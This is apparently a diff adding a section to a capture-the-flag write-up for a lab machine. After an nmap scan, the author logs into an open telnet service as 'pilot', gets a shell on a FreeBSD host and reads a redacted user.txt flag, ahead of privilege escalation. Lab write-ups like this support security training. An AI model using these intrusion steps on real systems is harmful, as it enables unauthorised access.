@@ -86,3 +86,57 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 355.73 seconds
            Raw packets sent: 66080 (2.908MB) | Rcvd: 65537 (2.621MB)
 ```
+
+I see from the output that telnet is running on the machine. I ran the following to connect to the machine:
+
+```bash
+$ telnet target.thm
+Trying 10.10.169.138...
+Connected to target.thm.
+Escape character is '^]'.
+login: pilot
+Last login: Sat Oct  5 23:48:53 from cpc147224-roth10-2-0-cust456.17-1.cable.virginm.net
+FreeBSD 11.2-STABLE (GENERIC) #0 r345837: Thu Apr  4 02:07:22 UTC 2019
+
+Welcome to FreeBSD!
+
+Release Notes, Errata: https://www.FreeBSD.org/releases/
+Security Advisories:   https://www.FreeBSD.org/security/
+FreeBSD Handbook:      https://www.FreeBSD.org/handbook/
+FreeBSD FAQ:           https://www.FreeBSD.org/faq/
+Questions List: https://lists.FreeBSD.org/mailman/listinfo/freebsd-questions/
+FreeBSD Forums:        https://forums.FreeBSD.org/
+
+Documents installed with the system are in the /usr/local/share/doc/freebsd/
+directory, or can be installed later with:  pkg install en-freebsd-doc
+For other languages, replace "en" with a language code like de or fr.
+
+Show the version of FreeBSD installed:  freebsd-version ; uname -a
+Please include that output and any error messages when posting questions.
+Introduction to manual pages:  man man
+FreeBSD directory layout:      man hier
+
+Edit /etc/motd to change this login announcement.
+Man pages are divided into section depending on topic.  There are 9 different
+sections numbered from 1 (General Commands) to 9 (Kernel Developer's Manual).
+You can get an introduction to each topic by typing
+
+	man <number> intro
+
+In other words, to get the intro to general commands, type
+
+	man 1 intro
+```
+
+Just like that, I have a shell on the machine. I look around to see where the user.txt file is:
+
+```bash
+$ whoami
+pilot
+$ ls
+user.txt
+$ cat user.txt
+REDACTED
+```
+
+Now that I have the user.txt flag, I need to escalate my privileges to get the root.txt flag.
